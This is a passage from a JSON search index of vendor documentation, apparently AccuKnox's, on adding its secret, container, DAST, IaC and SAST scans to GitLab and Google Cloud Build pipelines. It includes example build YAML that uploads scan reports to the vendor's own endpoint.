<code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. <code>cspm.demo.accuknox.com</code> <code>ACCUKNOX_LABEL</code> The label created in AccuKnox SaaS for associating scan results. <code>N/A (Required)</code> <p>Create a new pipeline in your GitLab project with the following YAML configuration:</p> <pre><code>include:\n  - component: $CI_SERVER_FQDN/accu-knox/scan/secret-scan@main\n    inputs:\n      STAGE: test\n      INPUT_SOFT_FAIL: false\n      ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n      ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n      ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n      ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/gitlab-secret-scan/#impact-of-accuknox-secret-scanning-integration","title":"Impact of AccuKnox Secret Scanning Integration","text":""},{"location":"integrations/gitlab-secret-scan/#before-integration","title":"Before Integration","text":"<p>Your pipeline might not perform secret scanning, potentially exposing sensitive data in your code.</p>"},{"location":"integrations/gitlab-secret-scan/#after-integration","title":"After Integration","text":"<p>AccuKnox Secret Scanning will run on every push, detecting hard-coded secrets and sensitive information. The findings are sent to AccuKnox for review and remediation. Only the scan results are uploaded, not the sensitive data.</p> <p></p>"},{"location":"integrations/gitlab-secret-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: Navigate to the Accuknox SaaS dashboard after the pipeline completes.</p> <p>Step 2: Go to Issues &gt; Findings and select Secret Scan Findings to see identified vulnerabilities.</p> <p></p>"},{"location":"integrations/gitlab-secret-scan/#step-3-review-detected-secrets","title":"Step 3: Review Detected Secrets","text":"<p>Examine the list of identified hardcoded secrets and sensitive information.</p> <p></p>"},{"location":"integrations/gitlab-secret-scan/#step-4-address-findings","title":"Step 4: Address Findings","text":"<p>For each finding, create a task in your issue-tracking system, advising secret rotation and the use of a secure secret management solution. Once resolved, mark the issue as fixed in the AccuKnox platform.</p> <p></p>"},{"location":"integrations/gitlab-secret-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox Secret Scanning into your GitLab CI/CD pipeline ensures a proactive security measure against hardcoded secrets. This helps mitigate risks early in development and guarantees that sensitive information is properly protected, enhancing the overall security of your codebase.</p>"},{"location":"integrations/google-build/","title":"Google Cloud Build Integration","text":"<p>To demonstrate the benefits of integrating AccuKnox into a CI/CD pipeline using Google Cloud Build to enhance security, let's consider a specific case involving a container image with known vulnerabilities. By incorporating AccuKnox scanning into the pipeline, we can identify and resolve these vulnerabilities before deploying the image. The detailed example below outlines this process by comparing the scenarios before and after the inclusion of AccuKnox, as evidenced in the Cloud Build logs.</p> <p></p>"},{"location":"integrations/google-build/#scenario-before-integrating-accuknox","title":"Scenario Before Integrating AccuKnox","text":"<p>Context: We initially used an outdated base image (<code>python:3.6-alpine</code>) with many known security vulnerabilities in the Dockerfile, unintentionally introducing security weaknesses into the Container image.</p> <p>Dockerfile Example</p> <pre><code>FROM python:3.6-alpine\n# Further configuration and setup of the image\n</code></pre> <p>Hypothetical Cloud Build Log - Pre AccuKnox Scan</p> <pre><code>Building Docker image...\nSuccessfully built d0c92993ff32\nSuccessfully tagged gcr.io/PROJECT_ID/IMAGE_NAME:latest\nThe push refers to repository [gcr.io/PROJECT_ID/IMAGE_NAME:latest]\nImage pushed successfully.\n</code></pre> <p>Before using AccuKnox, our container image was sent to the registry without any vulnerability checks. This oversight could allow vulnerable images to be deployed, opening up potential security risks.</p>"},{"location":"integrations/google-build/#scenario-after-integrating-accuknox","title":"Scenario After Integrating AccuKnox","text":"<p>Enhancing the Google Cloud Build workflow: We added a step to run the AccuKnox vulnerability scan on the newly built Container image</p> <p>Updated Google Cloud build Workflow Snippet (Incorporating AccuKnox Scan)</p> <pre><code> # Step 1: Scan the container image with AccuKnox and save the report\n  - name: 'accuknox/accuknox-container-scan'\n    args: [\n      'image',\n      '--format', 'json',\n      '--output', '/workspace/accuknox-report.json',\n      '${_IMAGE_URL}:${_IMAGE_TAG}'\n    ]\n    id: 'accuknox-container-scan'\n  # Step 2: Upload the AccuKnox report to Cloud Storage\n  - name: 'gcr.io/cloud-builders/gsutil'\n    args: ['cp', '/workspace/accuknox-report.json', 'gs://BUCKET_NAME/accuknox-report.json']\n    waitFor: ['accuknox-container-scan']\n  # Step 3: Print the AccuKnox container scan results\n  - name: 'ubuntu'\n    entrypoint: 'cat'\n    args: ['/workspace/accuknox-report.json']\n    waitFor: ['accuknox-container-scan']\n  # Step 4: Access the secret using gcloud and save it to a file\n  - name: 'gcr.io/cloud-builders/gcloud'\n    entrypoint: 'bash'\n    args: [\n      '-c',\n      \"gcloud secrets versions access latest --secret=accuknox_token --format='get(payload.data)' | tr '_-' '/+' | base64 -d &gt; /workspace/decrypted-data.txt\"\n    ]\n    id: 'access-secret'\n  # Step 5: Forward the logs to the SaaS platform using curl\n  - name: 'gcr.io/cloud-builders/curl'\n    entrypoint: 'bash'\n    args:\n      [\n        '-c',\n        'curl --location --request POST \"https://${_CSPM_URL}/api/v1/artifact/?tenant_id=${_TENANT_ID}&amp;data_type=TR&amp;save_to_s3=false\" --header \"Tenant-Id: ${_TENANT_ID}\" --header \"Authorization: Bearer $(cat /workspace/decrypted-data.txt)\" --form \"file=@/workspace/accuknox-report.json\"'\n      ]\n    waitFor: ['access-secret']\n    id: 'forward-result-to-accuknox-saas'\n  # Step 6: If there are critical vulnerabilities, stop deployment\n  - name: 'bash'\n    entrypoint: 'bash'\n    args:\n      [\n        '-c',\n        'if grep -q \"CRITICAL\" /workspace/accuknox-report.json; then echo \"AccuKnox Scan has halted the deployment because it detected critical vulnerabilities\"; exit 1; else exit 0; fi'\n      ]\n    waitFor: ['forward-result-to-accuknox-saas']\n# Define substitutions\nsubstitutions:\n  _IMAGE_URL: 'gcr.io/PROJECT_ID/IMAGE_NAME'\n  _IMAGE_TAG: 'latest'\n  _CSPM_URL: 'cspm.demo.accuknox.com'\n  _TENANT_ID: 'TENANT_ID'\n</code></pre> <p>Google Cloud Build Logs - Post AccuKnox Integration</p> <pre><code>Pulling image: accuknox/accuknox-container-scan\nUsing default tag: latest\nlatest: Pulling from accuknox/accuknox-container-scan\nImage built successfully: accuknox-container-scan:latest\nScanning IMAGE_NAME:latest with AccuKnox...\nAccuKnox Scan has halted the deployment because it detected critical vulnerabilities\n</code></pre> <p>AccuKnox carefully analyzed the image and found critical and high-severity vulnerabilities. Based on these findings, the workflow stopped and prevented the vulnerable image from being deployed.</p> <p></p>"},{"location":"integrations/google-build/#remediation-and-rescan","title":"Remediation and Rescan","text":"<p>Fortifying the Dockerfile: After seeing the vulnerabilities, we updated the Dockerfile to use a newer, more secure base image (<code>python:3.12-alpine3.20</code>) instead, to fix the security issues.</p> <p>Dockerfile Post-Update</p> <pre><code>FROM python:3.12-alpine3.20\n# Additional image enhancements and setup\n</code></pre> <p>Google Cloud Build Log - After Remediation</p> <pre><code>Step #6: Already have image (with digest): gcr.io/cloud-builders/docker\nStep #6: Using default tag: latest\nStep #6: The push refers to repository [gcr.io/PROJECT_ID/IMAGE_NAME]\nStep #6: e6186d22a913: Preparing\nStep #6: 26c23c05c010: Preparing\nStep #6: dca0954f6f4a: Preparing\nStep #6: 0fff41d85627: Preparing\nStep #6: cd8444199228: Preparing\nStep #6: caa01d103c54: Preparing\nStep #6: 02f2bcb26af5: Preparing\nStep #6: 02f2bcb26af5: Waiting\nStep #6: e6186d22a913: Pushed\nStep #6: 0fff41d85627: Pushed\nStep #6: dca0954f6f4a: Pushed\nStep #6: 26c23c05c010: Pushed\nStep #6: caa01d103c54: Pushed\nStep #6: cd8444199228: Pushed\nStep #6: 02f2bcb26af5: Pushed\nStep #6: latest: digest: sha256:0cb41e89c1b8daef61a837d281107dcbdfa88b584e7f0ebbb36414fc8a3f3aee size: 1788\nFinished Step #6\nPUSH\nPushing gcr.io/PROJECT_ID/IMAGE_NAME:latest\nThe push refers to repository [gcr.io/PROJECT_ID/IMAGE_NAME]\nlatest: digest: sha256:0cb41e89c1b8daef61a837d281107dcbdfa88b584e7f0ebbb36414fc8a3f3aee size: 1788\nDONE\n</code></pre> <p>After addressing the vulnerabilities, the AccuKnox scan approved the updated image, allowing it to be safely pushed to the registry. This example highlights the importance of including vulnerability scanning in the pipeline. It prevents insecure images from being deployed to production, ensuring that only secure images are allowed.</p> <p></p>"},{"location":"integrations/google-build/#accuknox-container-scan-integration-with-google-cloud-build-pipeline","title":"AccuKnox Container scan integration with Google Cloud Build Pipeline","text":""},{"location":"integrations/google-build/#pre-requisites","title":"Pre-requisites","text":"<ol> <li> <p>GCP Console access: Google Cloud console access to create the workflow</p> </li> <li> <p>gcloud CLI configured: To interact with GCP via CLI</p> </li> <li> <p>Github/Google cloud source repositories: A git repository to store our code, a containerized \u201cpython-app\u201d written in Python.</p> </li> <li> <p>Google Container Registry: The registry where we will push the images we will build.</p> </li> <li> <p>Google Secret Manager: To store the AccuKnox API token, you must grant permissions to the Cloud Build agents to access secrets.</p> </li> </ol>"},{"location":"integrations/google-build/#creating-a-cloud-build-workflow-for-image-scanning","title":"Creating a Cloud Build workflow for image scanning","text":"<p>We\u2019ll follow a basic \u201cimage scanning for Google Cloud Build\u201d example project:</p> <ol> <li> <p>Build the container image.</p> </li> <li> <p>Get the secret token required to communicate with the AccuKnox Saas Platform.</p> </li> <li> <p>Scan the container image with AccuKnox Container Scan.</p> </li> <li> <p>Push the container image to a registry.</p> </li> </ol> <p></p>"},{"location":"integrations/google-build/#steps-for-integration","title":"Steps for integration","text":"<p>Step 1: The user needs to create a codebuild.yaml file in their GitHub/Google code repository using the following workflow Template:</p> <pre><code> # Step 1: Scan the container image with AccuKnox and save the report\n  - name: 'accuknox/accuknox-container-scan'\n    args: [\n      'image',\n      '--format', 'json',\n      '--output', '/workspace/accuknox-report.json',\n      '${_IMAGE_URL}:${_IMAGE_TAG}'\n    ]\n    id: 'accuknox-container-scan'\n  # Step 2: Upload the AccuKnox report to Cloud Storage\n  - name: 'gcr.io/cloud-builders/gsutil'\n    args: ['cp', '/workspace/accuknox-report.json', 'gs://BUCKET_NAME/accuknox-report.json']\n    waitFor: ['accuknox-container-scan']\n  # Step 3: Print the AccuKnox container scan results\n  - name: 'ubuntu'\n    entrypoint: 'cat'\n    args: ['/workspace/accuknox-report.json']\n    waitFor: ['accuknox-container-scan']\n  # Step 4: Access the secret using gcloud and save it to a file\n  - name: 'gcr.io/cloud-builders/gcloud'\n    entrypoint: 'bash'\n    args: [\n      '-c',\n      \"gcloud secrets versions access latest --secret=accuknox_token --format='get(payload.data)' | tr '_-' '/+' | base64 -d &gt; /workspace/decrypted-data.txt\"\n    ]\n    id: 'access-secret'\n  # Step 5: Forward the logs to the SaaS platform using curl\n  - name: 'gcr.io/cloud-builders/curl'\n    entrypoint: 'bash'\n    args:\n      [\n        '-c',\n        'curl --location --request POST \"https://${_CSPM_URL}/api/v1/artifact/?tenant_id=${_TENANT_ID}&amp;data_type=TR&amp;save_to_s3=false\" --header \"Tenant-Id: ${_TENANT_ID}\" --header \"Authorization: Bearer $(cat /workspace/decrypted-data.txt)\" --form \"file=@/workspace/accuknox-report.json\"'\n      ]\n    waitFor: ['access-secret']\n    id: 'forward-result-to-accuknox-saas'\n  # Step 6: If there are critical vulnerabilities, stop deployment\n  - name: 'bash'\n    entrypoint: 'bash'\n    args:\n      [\n        '-c',\n        'if grep -q \"CRITICAL\" /workspace/accuknox-report.json; then echo \"AccuKnox Scan has halted the deployment because it detected critical vulnerabilities\"; exit 1; else exit 0; fi'\n      ]\n    waitFor: ['forward-result-to-accuknox-saas']\n# Define substitutions\nsubstitutions:\n  _IMAGE_URL: 'gcr.io/PROJECT_ID/IMAGE_NAME'\n  _IMAGE_TAG: 'latest'\n  _CSPM_URL: 'cspm.demo.accuknox.com'\n  _TENANT_ID: 'TENANT_ID'\n</code></pre> <p>Note: In the above template, the user needs to change some variables, including  <code>TENANT_ID</code>, <code>IMAGE_NAME</code>, <code>BUCKET_NAME</code>, and <code>PROJECT_ID</code>. Values for these variables can be viewed from the AccuKnox SaaS and GCP console.</p> <p>Step 2: Now, when a user attempts to push any changes to the repository, the workflow will be triggered, performing the necessary steps for scanning and posting the results to AccuKnox SaaS.</p> <p>Note: The user can configure the workflow according to their needs, setting it to trigger on events such as push, pull, etc.</p> <p>Step 3: Once the scan is complete, the user will be able to go into the AccuKnox SaaS and navigate to Issues \u2192 Registry Scan where they can find their repository name and select it to see the findings associated with it.</p> <p></p> <p>Step 4: After clicking on the image name, the user will be able to see the metadata for the image that was built during the workflow execution.</p> <p></p> <p>Step 5: In the Vulnerabilities section, the user can see the image-specific vulnerabilities in a list manner that contains relevant information. These findings will also be available in Issues \u2192 Vulnerabilities section where the user can manage these findings with others as well.</p> <p></p> <p>Step 6: The Resources section contains information about packages and modules that were used to build the code base into a container image.</p> <p></p> <p>Step 7: The Sensitive Data section contains information about any secrets or credentials that might be exposed in the image.</p> <p></p> <p>Step 8: The user can see the scan history of every scan that happened while pushing any changes to the repo.</p> <p></p>"},{"location":"integrations/google-build/#conclusion","title":"Conclusion","text":"<p>Google offers a complete ecosystem for CI/CD that includes Google Cloud Build, Google Cloud Registry, Google Cloud Repository, and Google Secret Manager. AccuKnox container scanning brings several benefits to the mix:</p> <ul> <li> <p>Image scanning in a CI/CD pipeline stops vulnerable images from reaching a registry.</p> </li> <li> <p>With inline scanning, image contents like proprietary source code or leaked credentials stay in your pipeline. Only the report from the analysis is sent to the image scanner's backend.</p> </li> <li> <p>From AccuKnox Saas users can view the vulnerabilities and mitigate the CRITICAL/HIGH vulnerabilities</p> </li> <li> <p>Once the issues are fixed users can trigger the scan again and observe the changes in the vulnerabilities to make sure the fixed image gets to the registry</p> </li> </ul> <p>AccuKnox container scanning also integrates seamlessly with most CI/CD pipeline tools, including Jenkins, GitHub, GitLab, Azure Pipelines, AWS CodePipelines, etc.</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/google-dast/","title":"Google Cloud DAST","text":"<p>To demonstrate the benefits of incorporating AccuKnox into a CI/CD pipeline using Google Cloud Build to enhance security, consider a specific scenario involving a Domain with known vulnerabilities. By integrating AccuKnox scanning into the pipeline, we can identify and resolve these security issues.</p> <p></p>"},{"location":"integrations/google-dast/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>GCP Console Access</p> </li> <li> <p>AccuKnox UI Access</p> </li> <li> <p>Google Cloud build Pipeline</p> </li> <li> <p>Github/Google Cloud source repositories</p> </li> </ul>"},{"location":"integrations/google-dast/#steps-for-integration","title":"Steps for integration","text":"<p>Step 1: Log in to AccuKnox Saas, Navigate to Settings, and select Tokens to create an AccuKnox token for forwarding scan results to Saas</p> <p></p> <p>Note: Copy the token and create a Google Cloud secret for the token to be used as a secret in the pipeline. Also, copy the tenant ID value to be used in the Cloud Build YAML file.</p> <p>Step 2: Add AccuKnox Tokens to Google Cloud Secret Manager:</p> <ul> <li> <p>Add the following secrets:</p> <ul> <li><code>AK_TOK</code>: The artifact token received from the AccuKnox management plane</li> </ul> </li> </ul> <p></p> <p>Step 3: To integrate AccuKnox scans into your Google Cloud Build, set up a cloudbuild.yaml file in your repository with the following content:</p> <pre><code>steps:\n  # Step 1: Checkout code\n  - name: 'gcr.io/cloud-builders/git'\n    args: ['clone', '--single-branch', '--branch', 'main', '${_REPO_URL}', 'app']\n  # Step 2: Set up Docker Environment and change permissions\n  - name: 'gcr.io/cloud-builders/docker'\n    entrypoint: 'bash'\n    args:\n      - '-c'\n      - |\n        chmod -R 777 app\n  # Step 3: Run OWASP ZAP baseline scan\n  - name: 'gcr.io/cloud-builders/docker'\n    entrypoint: 'bash'\n    args:\n      - '-c'\n      - |\n        docker run --rm \\\n          -v $(pwd)/app:/zap/wrk \\\n          -w /zap/wrk \\\n          ghcr.io/zaproxy/zaproxy:stable \\\n          zap-baseline.py \\\n          -t {target-url} \\\n          -r scanreport.html \\\n          -x scanreport.xml \\\n          -J scanreport.json \\\n          -I\n  - name: 'gcr.io/cloud-builders/gcloud'\n    entrypoint: 'bash'\n    args:\n      - '-c'\n      - |\n        gcloud secrets versions access latest --secret=accuknox_token --format='get(payload.data)' | tr '_-' '/+' | base64 -d &gt; /workspace/decrypted-data.txt\n  # Step 5: Upload ZAP Scan Report\n  - name: 'gcr.io/cloud-builders/curl'\n    entrypoint: '/bin/sh'\n    args:\n      - '-c'\n      - |\n        curl --location --request POST \"https://${_AK_URL}/api/v1/artifact/?tenant_id=${_TENANT_ID}&amp;data_type=ZAP&amp;save_to_s3=false\" \\\n          --header \"Tenant-Id: ${_TENANT_ID}\" \\\n          --header \"Authorization: Bearer $(cat /workspace/decrypted-data.txt)\" \\\n          --form \"file=@\\\"app/scanreport.json\\\"\"\n# Substitutions for variables\nsubstitutions:\n  _AK_URL: \"{cspm.&lt;env-name&gt;.accuknox.com}\"\n  _TENANT_ID: \"{tenant-id}\"\n  _REPO_URL: \"https://github.com/{user-name}/{repo-name}\"  # Ensure this starts with http:// or https://\n# Optional: Specify a Cloud Storage bucket for logs\nlogsBucket: \"gs://{bucket-name}\"\n</code></pre> <p>Note: In the YAML file above, you need to replace the value for the GitHub URL with the actual user name and repository name. Under substitution, replace \"AK URL\" with the applicable \"cspm env-name\" (e.g. demo/dev/stage/prod), replace {taget-url} with the target you want to scan, replace \"bucket name\" with your GCP bucket name, and replace \"Tenant id\" with your tenant id copied in the Step 1.</p>"},{"location":"integrations/google-dast/#before-accuknox-scan","title":"Before AccuKnox Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox scan. When you push the changes to the repository it does not perform any security checks, potentially allowing security issues in the application.</p>"},{"location":"integrations/google-dast/#after-accuknox-scan-integration","title":"After AccuKnox Scan Integration","text":"<p>After integrating AccuKnox into your CI/CD pipeline, the next push triggers the Google Cloudbuild workflow. The AccuKnox scan identifies the potential vulnerability in the domain URL.</p> <p></p> <p>To view the Results in AccuKnox Saas:</p> <p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Vulnerabilities and select Data Type as ZAP to view the identified vulnerabilities.</p> <p></p> <p>Step 3: Click on the Vulnerability to view more details</p> <p></p> <p>Step 4: Fix the Vulnerability</p> <p>To fix the Cross-Domain Misconfiguration, follow the instructions in the Solutions tab.</p> <p></p> <p>Step 5: Create a ticket for fixing the Cross-Domain Misconfiguration by selecting the Ticket Configuration and clicking on the Create Ticket icon.</p> <p></p> <p>Step 6: Review the Updated Results</p> <ul> <li> <p>After fixing the vulnerability, please rerun the cloud build workflow.</p> </li> <li> <p>Once the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> </li> <li> <p>Go to Issues &gt; Vulnerabilities and select Data Type as ZAP to verify that the Cross-Domain Misconfiguration has been resolved.</p> </li> </ul>"},{"location":"integrations/google-dast/#conclusion","title":"Conclusion","text":"<p>Google offers a complete ecosystem for CI/CD that includes Google Cloud Build, Google Cloud Registry, Google Cloud Repository, and Google Secret Manager. AccuKnox code scanning brings several benefits to the mix:</p> <ul> <li> <p>AccuKnox DAST in a CI/CD pipeline Provides visibility over the potential security issues by scanning the Domain URL.</p> </li> <li> <p>From AccuKnox Saas users can view the findings and mitigate the CRITICAL/HIGH findings.</p> </li> <li> <p>Once the issues are resolved, users can trigger the scan again and observe the changes in the findings to ensure that the Domain URL is free from security issues</p> </li> </ul> <p>AccuKnox DAST also integrates seamlessly with most CI/CD pipeline tools, including Jenkins, GitHub, GitLab, Azure Pipelines, AWS CodePipelines, etc</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/google-iac/","title":"Google Cloud IaC Scan","text":"<p>To illustrate the advantages of integrating AccuKnox into a CI/CD pipeline using Google Cloud Build to improve security, let's take a specific scenario involving infrastructure-as-code (IaC) configurations with known misconfigurations. By adding AccuKnox scanning to the pipeline, we can detect and address these security issues before deploying the infrastructure.</p>"},{"location":"integrations/google-iac/#pre-requisite","title":"Pre-requisite","text":"<ul> <li> <p>GCP Console Access</p> </li> <li> <p>AccuKnox IaC scan</p> </li> <li> <p>Google Cloud build Pipeline</p> </li> <li> <p>Terraform for Infrastructure management</p> </li> <li> <p>Github/Google Cloud source repositories</p> </li> </ul>"},{"location":"integrations/google-iac/#steps-for-integration","title":"Steps for integration","text":"<p>Step 1: Login to AccuKnox Saas, Navigate to Settings, and select Tokens to create an AccuKnox token for forwarding scan results to Saas</p> <p></p> <p>Note: Copy the token and create a Google Cloud secret for the token to be used as a secret in the pipeline. Also, copy the tenant ID value to be used in the Cloud Build YAML file.</p> <p>Step 2: To integrate AccuKnox scans into your Google cloud build, set up a <code>cloudbuild.yaml</code> file in your repository with the following content:</p> <pre><code>steps:\n  # Step 1: Clone the GitHub repository\n  - name: 'gcr.io/cloud-builders/git'\n    entrypoint: 'bash'\n    args:\n      - '-c'\n      - |\n        git clone https://github.com/{user-name}/{repo-name}.git /workspace/AccuKnox_Iac\n  # Step 2: Install Checkov and run the scan, saving the report in JSON format\n  - name: 'python:3.8'\n    entrypoint: 'bash'\n    args:\n      - '-c'\n      - |\n        pip install checkov &amp;&amp; \\\n        checkov -d /workspace/AccuKnox_Iac --output json &gt; /workspace/checkov_report.json || true\n  # Step 3: Access the secret using gcloud and save it to a file\n  - name: 'gcr.io/cloud-builders/gcloud'\n    entrypoint: 'bash'\n    args:\n      - '-c'\n      - |\n        gcloud secrets versions access latest --secret=accuknox_token --format='get(payload.data)' | tr '_-' '/+' | base64 -d &gt; /workspace/decrypted-data.txt\n  # Step 4: Install jq and manipulate JSON report\n  - name: 'ubuntu'\n    entrypoint: 'bash'\n    args:\n      - '-c'\n      - |\n        apt-get update &amp;&amp; apt-get install -y jq &amp;&amp; \\\n        if [ \".\" = \"${directory}\" ] &amp;&amp; [ -z \"${file}\" ]; then \\\n          jq --arg repoLink \"${repository}\" --arg branch \"${branch}\" \\\n             '. += [{\"details\": {\"repo\": $repoLink, \"branch\": $branch}}]' \\\n             /workspace/checkov_report.json &gt; /workspace/results.json &amp;&amp; \\\n          mv /workspace/results.json /workspace/checkov_report.json; \\\n        else \\\n          echo '[' &gt; /workspace/results.json &amp;&amp; \\\n          cat /workspace/checkov_report.json &gt;&gt; /workspace/results.json &amp;&amp; \\\n          echo ']' &gt;&gt; /workspace/results.json &amp;&amp; \\\n          jq --arg repoLink \"${repository}\" --arg branch \"${branch}\" \\\n             '. += [{\"details\": {\"repo\": $repoLink, \"branch\": $branch}}]' \\\n             /workspace/results.json &gt; /workspace/tmp.json &amp;&amp; \\\n          mv /workspace/tmp.json /workspace/checkov_report.json; \\\n        fi  # Removed unnecessary &amp;&amp; here\n  # Step 6: Push report to CSPM panel\n  - name: 'gcr.io/cloud-builders/curl'\n    entrypoint: 'bash'\n    args:\n      - '-c'\n      - |\n        ls -l /workspace/  # Verify file existence and permissions\n        # Check if checkov_report.json exists before attempting to upload\n        if [ -f /workspace/checkov_report.json ]; then\n          curl --location --request POST \"https://${_CSPM_URL}/api/v1/artifact/?tenant_id=${_TENANT_ID}&amp;data_type=IAC&amp;save_to_s3=false\" \\\n            --header \"Tenant-Id: ${_TENANT_ID}\" \\\n            --header \"Authorization: Bearer $(cat /workspace/decrypted-data.txt)\" \\\n            --form \"file=@/workspace/checkov_report.json\"\n        else\n          echo \"checkov_report.json not found in /workspace/ directory\"\n          exit 1\n        fi\n# Artifacts to store the Checkov report\nartifacts:\n  objects:\n    location: 'gs://{bucket-name}/checkov-reports/'\n    paths:\n      - 'checkov_report.json'\n      - 'results.json'  # Ensure results.json is included as an artifact\n# Define substitutions\nsubstitutions:\n  _CSPM_URL: '{cspm.&lt;env-name&gt;.accuknox.com}'\n  _TENANT_ID: '{xxx}'\n  _BUCKET_NAME: 'gs://{bucket-name}'\n# Define timeout for the entire pipeline\ntimeout: '1200s'  # 20 minutes\nlogsBucket: 'gs://{bucket-name}'\n</code></pre> <p>Note: In the YAML file above, you need to replace the value for the GitHub URL with the actual user name and repository name. Under substitution, replace \"CSPM URL\" with the applicable \"cspm env-name\" (e.g. demo or use <code>\"{cspm.accuknox.com}\"</code> if you are making use of a paid SaaS subscription), replace \"bucket name\" with your GCP bucket name, and replace \"Tenant ID\" with your tenant ID copied in the Step 1.</p>"},{"location":"integrations/google-iac/#before-accuknox-scan","title":"Before AccuKnox Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox scan. When you push the Terraform code above, it gets deployed without any security checks, potentially allowing the storage bucket to access the public</p>"},{"location":"integrations/google-iac/#after-accuknox-scan-integration","title":"After AccuKnox Scan Integration","text":"<p>After integrating AccuKnox into your CI/CD pipeline, the next push triggers the Google Cloudbuild Actions workflow. The AccuKnox scan identifies the misconfiguration with the Google Cloud Storage bucket:</p> <pre><code>      {\n          \"check_id\": \"CKV_GCP_29\",\n          \"bc_check_id\": \"BC_GCP_GCS_2\",\n          \"check_name\": \"Ensure that Cloud Storage buckets have uniform bucket-level access enabled\",\n          \"check_result\": {\n            \"result\": \"FAILED\",\n            \"evaluated_keys\": [\n              \"uniform_bucket_level_access\"\n            ]\n          },\n          \"code_block\": [\n            [\n              8,\n              \"resource \\\"google_storage_bucket\\\" \\\"terraform_state\\\" {\\n\"\n            ],\n            [\n              9,\n              \"  name          = \\\"${var.bucket_name}\\\"\\n\"\n            ],\n            [\n              10,\n              \"  force_destroy = true\\n\"\n            ],\n            [\n              11,\n              \"}\\n\"\n            ]\n          ],\n          \"file_path\": \"/code/06-create-cloud-storage/main.tf\",\n          \"file_abs_path\": \"/workspace/AccuKnox_Iac/code/06-create-cloud-storage/main.tf\",\n          \"repo_file_path\": \"/AccuKnox_Iac/code/06-create-cloud-storage/main.tf\",\n          \"file_line_range\": [\n            8,\n            11\n          ],\n          \"resource\": \"google_storage_bucket.terraform_state\",\n          \"evaluations\": null,\n          \"check_class\": \"checkov.terraform.checks.resource.gcp.GoogleStorageBucketUniformAccess\",\n          \"fixed_definition\": null,\n          \"entity_tags\": null,\n          \"caller_file_path\": null,\n          \"caller_file_line_range\": null,\n          \"resource_address\": null,\n          \"severity\": null,\n          \"bc_category\": null,\n          \"benchmarks\": null,\n          \"description\": null,\n          \"short_description\": null,\n          \"vulnerability_details\": null,\n          \"connected_node\": null,\n          \"guideline\": \"https://docs.prismacloud.io/en/enterprise-edition/policy-reference/google-cloud-policies/google-cloud-storage-gcs-policies/bc-gcp-gcs-2\",\n          \"details\": [],\n          \"check_len\": null,\n          \"definition_context_file_path\": \"/workspace/AccuKnox_Iac/code/06-create-cloud-storage/main.tf\",\n          \"breadcrumbs\": {\n            \"name\": [\n              {\n                \"type\": \"variable\",\n                \"name\": \"bucket_name\",\n                \"path\": \"/workspace/AccuKnox_Iac/code/06-create-cloud-storage/vars.tf\",\n                \"module_connection\": false\n              }\n            ]\n          }\n      }\n</code></pre> <p>You can also access the same security finding on the AccuKnox SaaS UI</p> <p></p> <p>Under Google Codebuild History</p> <p></p>"},{"location":"integrations/google-iac/#view-results-under-accuknox-saas","title":"View Results Under AccuKnox SaaS","text":"<p>Step 1: Once the scan is complete, users can go into the AccuKnox SaaS platform and navigate to Issues \u2192 Vulnerabilities, where they can find misconfigurations in their Infrastructure as Code.</p> <p></p> <p>Step 2: The user must select IaC Scan from the data type filter next to the findings</p> <p></p> <p>Step 3: Clicking on the misconfiguration opens up the ticket creation dialog box.</p> <p></p> <p>Step 4: Choose a ticket configuration and click the adjacent button to create a ticket for remediation.</p> <p></p> <p>Step 5: Click on Create to create the ticket, Once it is created it will be visible in your ticketing tool dashboard.</p> <p>Step 6: After remediating the issue, rescan the Terraform script to ensure the misconfiguration has been fixed. Then, navigate to AccuKnox SaaS to view the updated findings.</p> <p></p>"},{"location":"integrations/google-iac/#conclusion","title":"Conclusion","text":"<p>Google offers a complete ecosystem for CI/CD that includes Google Cloud Build, Google Cloud Registry, Google Cloud Repository, and Google Secret Manager. AccuKnox IaC scanning brings several benefits to the mix:</p> <ul> <li> <p>IaC scanning in a CI/CD pipeline stops Security issues from reaching the cloud infrastructure.</p> </li> <li> <p>From AccuKnox Saas users can view the findings and mitigate the CRITICAL/HIGH findings.</p> </li> <li> <p>Once the issues are resolved, users can trigger the scan again and observe the changes in the findings to ensure that the updated terraform script successfully deploys the cloud infrastructure.</p> </li> </ul> <p>AccuKnox IaC scanning also integrates seamlessly with most CI/CD pipeline tools, including Jenkins, GitHub, GitLab, Azure Pipelines, AWS CodePipelines, etc.</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/google-overview/","title":"Google Cloud Build Integrations","text":""},{"location":"integrations/google-overview/#google-cloud-build-integrations","title":"Google Cloud Build Integrations","text":"<p>SAST (Static Analysis)</p> <p>Container Scan</p> <p>IaC Scan</p> <p>DAST (Dynamic Analysis)</p> <p></p>"},{"location":"integrations/google-sast/","title":"Google Cloud Build SAST","text":"<p>To demonstrate the benefits of incorporating AccuKnox into a CI/CD pipeline using Google Cloud Build to enhance security, consider a specific scenario involving a Java application with known vulnerabilities. By integrating AccuKnox scanning into the pipeline, we can identify and resolve these security issues before deployment.</p>"},{"location":"integrations/google-sast/#pre-requisite","title":"Pre-requisite","text":"<ul> <li> <p>GCP Console Access</p> </li> <li> <p>AccuKnox UI Access</p> </li> <li> <p>Sonarqube deployment</p> </li> <li> <p>Google Cloud build Pipeline</p> </li> <li> <p>Github/Google Cloud source repositories</p> </li> </ul>"},{"location":"integrations/google-sast/#steps-for-integration","title":"Steps for integration","text":"<p>Step 1: Log in to AccuKnox Saas, Navigate to Settings, and select Tokens to create an AccuKnox token for forwarding scan results to Saas</p> <p></p> <p>Note: Copy the token and create a Google Cloud secret for the token to be used as a secret in the pipeline. Also, copy the tenant ID value to be used in the Cloud Build YAML file.</p> <p>Step 2: Add 